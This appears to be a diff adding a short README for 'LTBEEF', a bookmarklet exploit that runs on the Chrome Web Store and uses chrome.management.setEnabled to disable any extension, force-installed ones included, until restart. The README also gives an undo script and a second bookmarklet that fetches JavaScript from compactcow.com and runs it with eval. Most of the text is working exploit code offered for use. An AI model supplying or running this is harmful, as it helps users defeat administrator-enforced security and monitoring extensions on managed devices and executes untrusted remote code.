@@ -1,0 +1,32 @@
+LTBEEF (literally the best exploit ever found) - by Bypassi
+
+Go to https://chrome.google.com/webstore and run this bookmarklet:  (DO NOT EDIT THIS CODE DO NOT EDIT THIS CODE)
+```js
+javascript:prompt('Extension IDs here: (seperated by commas)').split(',').forEach(i=>{chrome.management.setEnabled(i.trim(),!1)})
+```
+(You can get the id of an extension by going to `chrome://extensions`, clicking on the extension details button, and copying everything after the `=` in the URL)
+
+This will disable any extension (even force-installed) until `chrome://restart` or you sign out of your computer
+
+I am in genuine disbelief what the actual heck. 
+
+
+--------------------------------------------------------------------------------------------------------------------------------
+
+Undo LTBEEF without rebooting:
+Same steps as before, but use this script
+```JS
+javascript:prompt('Extension IDs here: (separated by commas)').split(',').forEach(i=>{chrome.management.setEnabled(i,!0)})``
+
+
+
+bookmarklet with a button to turn off each extension 
+https://compactcow.com/ltbeef
+bookmarklet code:
+`javascript:fetch("https://compactcow.com/ltbeef/exploit.js").then(data=>{data.text().then(text=>{eval(text)})});`
+click it once (not on a new tab) to get to the correct webstore page, then again to open the UI
+
+
+
+
+
